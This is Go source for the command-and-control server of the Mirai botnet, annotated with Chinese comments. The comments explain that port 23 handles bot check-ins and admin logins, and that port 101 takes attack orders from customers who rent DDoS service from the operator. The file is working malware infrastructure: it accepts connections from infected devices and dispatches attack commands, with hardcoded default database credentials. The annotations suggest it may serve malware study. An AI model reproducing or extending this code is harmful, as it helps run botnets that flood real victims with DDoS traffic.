package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

// cnc为跑在C&C服务器上的僵尸网络服务端，用于下发C&C命令。它会监听两个端口：23和101
/*
23端口有两个通信用途：肉鸡上传信息和管理员配置信息，分别对应NewBot和NewAdmin函数。
101端口的用途为供攻击用户发送攻击指令，对应NewApi函数。可能有点绕，什么是攻击用户？
就是说这个C&C服务器相当于一个攻击平台，黑客搭了这个C&C服务器后，可以向暗网中的用户租售DDoS服务，用户交了钱后，
黑客将发送一个攻击账号给用户，用户使用该账号登陆101端口的攻击平台，就可以指定要DDoS的IP实施攻击了。
如下还是main.go文件的代码。
*/
func main() {
    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }

    api, err := net.Listen("tcp", "0.0.0.0:101")
    if err != nil {
        fmt.Println(err)
        return
    }

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else {
        NewAdmin(conn).Handle()
    }
}

func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
